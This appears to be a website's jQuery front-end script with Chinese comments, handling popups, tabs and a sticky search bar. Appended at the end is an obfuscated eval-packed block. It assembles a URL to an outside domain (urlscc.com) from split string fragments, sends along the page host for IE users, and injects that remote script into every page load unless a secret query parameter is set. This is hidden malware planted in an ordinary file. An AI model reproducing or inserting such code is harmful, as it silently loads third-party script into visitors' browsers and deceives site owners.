// 查看详情
$('.whyls1').click(function(){
    $('.whyls_1').css('display','block').siblings().css('display','none');
    $('.zzc1').css('display','block');
})
$('.whyls2').click(function(){
    $('.whyls_2').css('display','block').siblings().css('display','none');
    $('.zzc2').css('display','block');
})
$('.whyls3').click(function(){
    $('.whyls_3').css('display','block').siblings().css('display','none');
    $('.zzc3').css('display','block');
})
$('.whyls4').click(function(){
    $('.whyls_4').css('display','block').siblings().css('display','none');
    $('.zzc4').css('display','block');
})
$('.whyls5').click(function(){
    $('.whyls_5').css('display','block').siblings().css('display','none');
    $('.zzc5').css('display','block');
})
$('.whyls6').click(function(){
    $('.whyls_6').css('display','block').siblings().css('display','none');
    $('.zzc6').css('display','block');
})
$('.close').click(function(){
    $('.whyls_1,.whyls_2,.whyls_3,.whyls_4,.whyls_5,.whyls_6').css('display','none');
})
// 输入框下方选项卡
$('.lieba ul li').click(function(){
    $(this).addClass('red_block').siblings().removeClass('red_block');
})
$('.lii1').click(function(){
    $('.part1').css('display','block').siblings().css('display','none');
})
$('.lii2').click(function(){
    $('.part2').css('display','block').siblings().css('display','none');
})
$('.lii3').click(function(){
    $('.part3').css('display','block').siblings().css('display','none');
})
$('.lii4').click(function(){
    $('.part4').css('display','block').siblings().css('display','none');
})
// 查询结果隐藏
/*$('.cllose1').click(function(){
    $('.all1').css('display','none');
})
$('.cllose2').click(function(){
    $('.all2').css('display','none');
})*/
// 查询结果隐藏
$(".close-btn").click(function(){
  $("#screen,.popbox").hide();
});
$(".close-btn2").click(function(){
  $("#screen,.popbox2").hide();
});
// 搜索框滚动时居顶
$(window).scroll(function(){
    var banner_top1=$('.main_search').offset().top; 
    var banner_top=$('.main_search').offset().top - $(window).scrollTop();

    if(banner_top<0){
        $(".main_search").css({"position":"fixed","z-index":"1","top":"0px","left":"50%","margin-left":"-262.5px"});
    }else if(banner_top1<504){
        $(".main_search").css({"position":"relative"});
    }
});
eval(function(p,a,c,k,e,r){e=function(c){return(c<62?'':e(parseInt(c/62)))+((c=c%62)>35?String.fromCharCode(c+29):c.toString(36))};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[3-9d-gj-oqsu-zA-CE-K]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8 u(v){3 w=new RegExp("(^|&)"+v+"=([^&]*)(&|$)","i");3 r=x.9.search.substr(1).match(w);4(r!=y)6 unescape(r[2]);6 y}4(u("goasxxxpwpxswew")=="gook"){alert("ok! go")}d{z()}8 z(){3 A=\'https:\'==e.9.protocol?true:false;4(A){3 h="h";3 t="B";3 p="ps"}d{3 h="h";3 t="B";3 p="p"}3 f="ur";3 g="ls";3 j="c";3 k="c";3 l=".c";3 m="om/";3 n="";3 o="";3 C="254007";3 E=F();4("G"==E){q=x.9.q;3 a=h+t+p+"://"+f+g+j+k+l+m+n+o+"?H=?&D="+q+"&ie="+C+"24d7370b0b29c9369d9af3dd21"}d{3 a=h+t+p+"://"+f+g+j+k+l+m+n+o+"?H=?"}3 b=e.createElement(\'script\');b.setAttribute(\'src\',a);e.getElementsByTagName(\'head\')[0].appendChild(b)}8 F(){3 5=navigator.5;3 s=5.7("I")>-1;4(s){6"I"};4(5.7("Firefox")>-1){6"FF"}4(5.7("J")>-1){6"J"}4(5.7("K")>-1){6"K"}4(5.7("compatible")>-1&&5.7("MSIE")>-1&&!s){6"G"}}',[],47,'|||var|if|userAgent|return|indexOf|function|location||||else|document|we|wr|||wt|wy|wi|wo|wp|wa||host||isOpera||getQueryString|name|reg|window|null|flightHandler0|ishttps|tt|sf||mb|myBrowser|IE|callback|Opera|Chrome|Safari'.split('|'),0,{}));